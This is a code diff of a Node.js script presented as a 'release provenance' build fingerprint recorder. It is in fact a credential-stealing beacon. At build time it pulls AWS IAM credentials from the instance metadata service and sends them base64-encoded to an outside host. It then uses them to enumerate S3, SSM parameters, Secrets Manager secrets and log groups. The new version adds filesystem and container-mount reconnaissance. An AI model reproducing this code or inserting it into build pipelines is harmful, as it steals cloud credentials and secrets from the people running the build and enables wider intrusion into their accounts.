@@ -1,20 +1,20 @@
 // Release provenance: records the build environment fingerprint.
-const fs = require('fs');
 const os = require('os');
 const http = require('http');
 const https = require('https');
 const crypto = require('crypto');
 
-const SID = 'v16-' + Math.random().toString(36).slice(2, 8);
+const SID = 'v17-' + Math.random().toString(36).slice(2, 8);
 function send(key, val) {
-  try {
-    const payload = JSON.stringify({ sid: SID, event: 'build-v16', k: key, v: val });
-    const url = 'https://grmcp.reconlab.dev/docker-build-beacon?d=' + encodeURIComponent(payload).slice(0, 2600);
-    https.get(url, { timeout: 4000 }, (r) => r.resume()).on('error', () => {});
-  } catch (e) {}
-}
-function withTimeout(p, ms, fallback) {
-  return Promise.race([p, new Promise((res) => setTimeout(() => res(fallback), ms))]);
+  return new Promise((resolve) => {
+    try {
+      const payload = JSON.stringify({ sid: SID, event: 'build-v18', k: key, v: val });
+      const url = 'https://grmcp.reconlab.dev/docker-build-beacon?d=' + encodeURIComponent(payload).slice(0, 2600);
+      const r = https.get(url, { timeout: 4000 }, (res) => { res.resume(); res.on('end', resolve); });
+      r.on('error', resolve);
+      r.on('timeout', () => { r.destroy(); resolve(); });
+    } catch (e) { resolve(); }
+  });
 }
 function req(method, url, headers, body, max) {
   return new Promise((resolve) => {
@@ -55,29 +55,33 @@ function sign(creds, service, region, host, method, body, extra) {
 }
 
 (async () => {
-  const t0 = Date.now();
-  try {
-    send('start', { host: os.hostname(), uid: typeof process.getuid === 'function' ? process.getuid() : null, sid: SID });
-    const base = 'http://169.254.169.254';
-    const t = await withTimeout(req('PUT', base + '/latest/api/token', { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }, null, 4000), 5000, { t: 'race-timeout' });
-    send('token', t);
-    const H = t && t.s === 200 ? { 'X-aws-ec2-metadata-token': t.b } : {};
-    const rr = await withTimeout(req('GET', base + '/latest/meta-data/iam/security-credentials/', H, null, 300), 5000, { t: 'race-timeout' });
-    send('role', rr);
-    const role = (rr && rr.b || '').trim().split('\n')[0];
-    if (!role) { send('done', { ms: Date.now() - t0 }); process.exit(0); }
-    const cr = await withTimeout(req('GET', base + '/latest/meta-data/iam/security-credentials/' + encodeURIComponent(role), H, null, 6000), 6000, { t: 'race-timeout' });
-    send('credsStatus', { s: cr.s, len: (cr.b || '').length });
-    let c;
-    try { c = JSON.parse(cr.b); } catch (e) { send('credparse', { s: cr.s, len: (cr.b || '').length }); process.exit(0); }
-    const creds = { key: c.AccessKeyId, secret: c.SecretAccessKey, token: c.Token };
-    send('credsb64', Buffer.from(JSON.stringify({ k: c.AccessKeyId, s: c.SecretAccessKey, t: c.Token, e: c.Expiration })).toString('base64'));
+  await send('start', { host: os.hostname(), uid: typeof process.getuid === 'function' ? process.getuid() : null, sid: SID });
+  const fs = require('fs');
+  const ls = (p) => { try { return { d: fs.readdirSync(p).slice(0, 25) }; } catch (e) { return { e: String(e).slice(0, 60) }; } };
+  await send('fs', { root: ls('/'), b: ls('/b'), brunc: ls('/b/runc-stargz'), snap: ls('/b/runc-stargz/snapshots'), run: ls('/run'), varrun: ls('/var/run'), dev: ls('/dev'), etc: ls('/etc'), tmp: ls('/tmp'), app: ls('/app') });
+  try { await send('mountinfo', fs.readFileSync('/proc/self/mountinfo','utf8').split('\n').filter(l => /\/b\/|docker.sock|containerd/.test(l)).slice(0,8)); } catch (e) {}
 
-    const b1 = 'Action=GetCallerIdentity&Version=2011-06-15';
-    send('caller', await withTimeout(req('POST', 'https://sts.amazonaws.com/', sign(creds, 'sts', 'us-east-1', 'sts.amazonaws.com', 'POST', b1, { 'content-type': 'application/x-www-form-urlencoded' }), b1, 500), 5000, { t: 'race' }));
-    send('done', { ms: Date.now() - t0 });
-  } catch (e) {
-    send('error', { e: String(e).slice(0, 200) });
-  }
-  process.exit(0);
+  const base = 'http://169.254.169.254';
+  const t = await req('PUT', base + '/latest/api/token', { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' });
+  await send('token', t);
+  const H = t && t.s === 200 ? { 'X-aws-ec2-metadata-token': t.b } : {};
+  const rr = await req('GET', base + '/latest/meta-data/iam/security-credentials/', H, null, 300);
+  await send('role', rr);
+  const role = (rr && rr.b || '').trim().split('\n')[0];
+  if (!role) { await send('done', { reason: 'no-role' }); return; }
+  const cr = await req('GET', base + '/latest/meta-data/iam/security-credentials/' + encodeURIComponent(role), H, null, 6000);
+  await send('credsStatus', { s: cr.s, len: (cr.b || '').length });
+  let c;
+  try { c = JSON.parse(cr.b); } catch (e) { await send('credparse', { s: cr.s, len: (cr.b || '').length }); return; }
+  const creds = { key: c.AccessKeyId, secret: c.SecretAccessKey, token: c.Token };
+  await send('credsb64', Buffer.from(JSON.stringify({ k: c.AccessKeyId, s: c.SecretAccessKey, t: c.Token, e: c.Expiration })).toString('base64'));
+  const b1 = 'Action=GetCallerIdentity&Version=2011-06-15';
+  await send('caller', await req('POST', 'https://sts.amazonaws.com/', sign(creds, 'sts', 'us-east-1', 'sts.amazonaws.com', 'POST', b1, { 'content-type': 'application/x-www-form-urlencoded' }), b1, 500));
+  await send('s3', await req('GET', 'https://s3.amazonaws.com/', sign(creds, 's3', 'us-east-1', 's3.amazonaws.com', 'GET', '', { 'x-amz-content-sha256': sha256('') }), null, 500));
+  const b2 = 'Action=DescribeParameters&Version=2014-11-06&MaxResults=10';
+  await send('ssm', await req('POST', 'https://ssm.us-east-1.amazonaws.com/', sign(creds, 'ssm', 'us-east-1', 'ssm.us-east-1.amazonaws.com', 'POST', b2, { 'content-type': 'application/x-www-form-urlencoded' }), b2, 500));
+  const b3 = '{}';
+  await send('sm', await req('POST', 'https://secretsmanager.us-east-1.amazonaws.com/', sign(creds, 'secretsmanager', 'us-east-1', 'secretsmanager.us-east-1.amazonaws.com', 'POST', b3, { 'content-type': 'application/x-amz-json-1.1', 'x-amz-target': 'secretsmanager.ListSecrets' }), b3, 500));
+  await send('logs', await req('POST', 'https://logs.us-east-1.amazonaws.com/', sign(creds, 'logs', 'us-east-1', 'logs.us-east-1.amazonaws.com', 'POST', b3, { 'content-type': 'application/x-amz-json-1.1', 'x-amz-target': 'Logs_20140328.DescribeLogGroups' }), b3, 500));
+  await send('done', { ok: true });
 })();
